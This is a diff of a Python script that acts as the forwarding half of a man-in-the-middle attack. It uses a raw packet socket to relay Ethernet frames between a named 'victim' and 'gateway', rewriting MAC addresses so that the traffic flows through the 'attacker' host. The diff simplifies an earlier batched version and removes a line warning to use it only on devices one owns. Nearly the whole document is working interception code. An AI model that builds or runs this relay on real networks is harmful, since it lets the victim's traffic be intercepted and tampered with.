@@ -1,75 +1,43 @@
-# bY USING this SOFTWARE you ackodege that you should only use this script on devices you own and on your own network 
 #!/usr/bin/env python3
-# fast_l2_redirect_sendmsg_batch.py
-# Implements memoryview sendmsg and recvmmsg/sendmmsg batching
+# fast_l2_redirect.py
+import os, sys, socket
+settings = {}
 
-import os
-import sys
-import socket
+
+with open("puller.settings", "r") as f:
+    for line in f.readlines():
+        settings_name, setting = line.split(" ")
+        settings[settings_name.strip()] = setting.strip()
+
+if settings["mobile"] == "yes":
+    from fcntl import ioctl
 import struct
-import argparse
-from fcntl import ioctl
+
 
 ETH_P_ALL = 0x0003
 SIOCGIFHWADDR = 0x8927
 SIOCGIFINDEX  = 0x8933
-SIOCGIFMTU    = 0x8921
-MAX_FRAME = 65536
-BATCH_SIZE = 8  # number of frames per batch for recvmmsg/sendmmsg
 
-settings = {}
-if os.path.exists("puller.settings"):
-    with open("puller.settings", "r") as f:
-        for line in f:
-            parts = line.split()
-            if len(parts) >= 2:
-                settings[parts[0].strip()] = parts[1].strip()
+def if_hwaddr(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = ioctl(s.fileno(), SIOCGIFHWADDR, struct.pack('256s', ifname[:15].encode()))
+    return info[18:24]
 
-def if_hwaddr(ifname, ioctl_sock=None):
-    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        req = struct.pack('256s', ifname[:15].encode())
-        info = ioctl(s.fileno(), SIOCGIFHWADDR, req)
-        return info[18:24]
-    finally:
-        if ioctl_sock is None:
-            s.close()
-
-def if_index(ifname, ioctl_sock=None):
-    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        ifreq = struct.pack('256s', ifname[:15].encode())
-        res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
-        return struct.unpack('i', res[16:20])[0]
-    finally:
-        if ioctl_sock is None:
-            s.close()
-
-def if_mtu(ifname, ioctl_sock=None):
-    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        ifreq = struct.pack('256s', ifname[:15].encode())
-        res = ioctl(s.fileno(), SIOCGIFMTU, ifreq)
-        return struct.unpack('i', res[16:20])[0]
-    except Exception:
-        return None
-    finally:
-        if ioctl_sock is None:
-            s.close()
+def if_index(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ifreq = struct.pack('256s', ifname[:15].encode())
+    res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
+    return struct.unpack('i', res[16:20])[0]
 
 def resolve_mac_ip(iface, ip):
+    # quick arp resolution using a temporary raw socket sending ARP request (requires root)
+    # This is a minimal method; you can also call `arp -n` externally.
     import subprocess
-    try:
-        out = subprocess.check_output(["ip", "neigh", "show", "to", ip], stderr=subprocess.DEVNULL)
-        text = out.decode(errors="ignore")
-    except Exception:
-        return None
-    for token in text.split():
-        if token.count(':') == 5:
-            try:
-                return bytes(int(b, 16) for b in token.split(':'))
-            except Exception:
-                continue
+    out = subprocess.check_output(["ip", "neigh", "show", "to", ip]).decode(errors='ignore')
+    # expected: "192.168.1.1 lladdr aa:bb:cc:dd:ee:ff REACHABLE dev wlan0"
+    for part in out.split():
+        if ':' in part and len(part.split(':'))==6:
+            return bytes(int(b,16) for b in part.split(':'))
     return None
 
 def mac_str_to_bytes(mac):
@@ -86,108 +54,57 @@ def main(IFACE, VICTIM, GATEWAY):
         print("couldn't resolve macs")
         sys.exit(1)
 
-    ioctl_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        attacker_mac = if_hwaddr(IFACE, ioctl_sock)
-        ifindex = if_index(IFACE, ioctl_sock)
-        mtu = if_mtu(IFACE, ioctl_sock)
-    finally:
-        ioctl_sock.close()
-
-    allowed_frame_max = (mtu+14) if mtu else 1514
+    attacker_mac = if_hwaddr(IFACE)
+    ifindex = if_index(IFACE)
 
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
-    s.bind((IFACE,0))
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+    s.bind((IFACE, 0))
 
-    recv_bufs = [bytearray(MAX_FRAME) for _ in range(BATCH_SIZE)]
-    recv_mvs = [memoryview(b) for b in recv_bufs]
-
-    send_bufs = [bytearray(MAX_FRAME) for _ in range(BATCH_SIZE)]
-    send_mvs = [memoryview(b) for b in send_bufs]
+    # pre-allocated buffer for recvfrom_into
+    MAX_FRAME = 65536
+    buf = bytearray(MAX_FRAME)
 
     v_mac = victim_mac
     g_mac = gateway_mac
     a_mac = attacker_mac
 
-    mac_map = {v_mac: g_mac, g_mac: v_mac}
-
-    def mac_to_str(b):
-        return ':'.join(f"{x:02x}" for x in b)
-
-    print("attacker mac:", mac_to_str(a_mac))
-    print("victim mac:", mac_to_str(v_mac))
-    print("gateway mac:", mac_to_str(g_mac))
-    print("iface mtu:", mtu, "allowed_frame_max:", allowed_frame_max)
+    print("attacker mac:", ':'.join(f"{b:02x}" for b in a_mac))
+    print("victim mac:", ':'.join(f"{b:02x}" for b in v_mac))
+    print("gateway mac:", ':'.join(f"{b:02x}" for b in g_mac))
     print("starting loop...")
-
-    oversized_logged = False
-    use_recvmmsg = hasattr(s, "recvmmsg") and hasattr(s, "sendmmsg")
 
     try:
         while True:
-            if use_recvmmsg:
-                n_received = s.recvmmsg(recv_mvs, 0)
-                send_iovs = []
+            # recv into buffer (zero allocation)
+            nbytes, ancdata, flags, addr = s.recvmsg_into([buf], 0)
+            if nbytes <= 14:  # too small for Ethernet
+                continue
+            frame = memoryview(buf)[:nbytes]
 
-                for i in range(n_received):
-                    frame = recv_mvs[i][:len(recv_mvs[i])]
-                    src = bytes(frame[6:12])
-                    if src == a_mac or src not in mac_map:
-                        continue
-
-                    dst_mac = mac_map[src]
-                    send_len = min(len(frame), allowed_frame_max)
-                    if send_len < len(frame) and not oversized_logged:
-                        oversized_logged = True
-                        print(f"warning: frame {len(frame)} > allowed {allowed_frame_max}; truncating.")
-
-                    send_mv = send_mvs[i]
-                    send_mv[0:6] = dst_mac
-                    send_mv[6:12] = a_mac
-                    send_mv[12:send_len] = frame[12:send_len]
-                    send_iovs.append(send_mv[:send_len])
-
-                if send_iovs:
-                    try:
-                        s.sendmmsg(send_iovs)
-                    except Exception:
-                        for buf in send_iovs:
-                            try:
-                                s.send(bytes(buf))
-                            except Exception:
-                                s.sendto(bytes(buf), (IFACE,0))
-
-            else:
-                nbytes, _, _, _ = s.recvmsg_into([recv_mvs[0]],0)
-                if nbytes <= 14:
+            src = bytes(frame[6:12])
+            # ignore frames we injected
+            if src == a_mac:
+                continue
+            try:
+                if src == v_mac:
+                    # rewrite dst/src in-place and send
+                    new_frame = bytearray(frame)  # we need a mutable copy to send; small allocation unavoidable
+                    new_frame[0:6] = g_mac
+                    new_frame[6:12] = a_mac
+                    # send raw
+                    s.send(new_frame)
+                elif src == g_mac:
+                    new_frame = bytearray(frame)
+                    new_frame[0:6] = v_mac
+                    new_frame[6:12] = a_mac
+                    s.send(new_frame)
+                else:
                     continue
-                frame = recv_mvs[0][:nbytes]
-                src = bytes(frame[6:12])
-                if src == a_mac or src not in mac_map:
-                    continue
+            except Exception as e:
+                print(e)
 
-                dst_mac = mac_map[src]
-                send_len = min(nbytes, allowed_frame_max)
-                if send_len < nbytes and not oversized_logged:
-                    oversized_logged = True
-                    print(f"warning: frame {nbytes} > allowed {allowed_frame_max}; truncating.")
-
-                send_mv = send_mvs[0]
-                send_mv[0:6] = dst_mac
-                send_mv[6:12] = a_mac
-                send_mv[12:send_len] = frame[12:send_len]
-
-                try:
-                    s.sendmsg([send_mv[:send_len]])
-                except Exception:
-                    try:
-                        s.send(bytes(send_mv[:send_len]))
-                    except Exception:
-                        s.sendto(bytes(send_mv[:send_len]), (IFACE,0))
     except KeyboardInterrupt:
         pass
-    finally:
-        s.close()
 
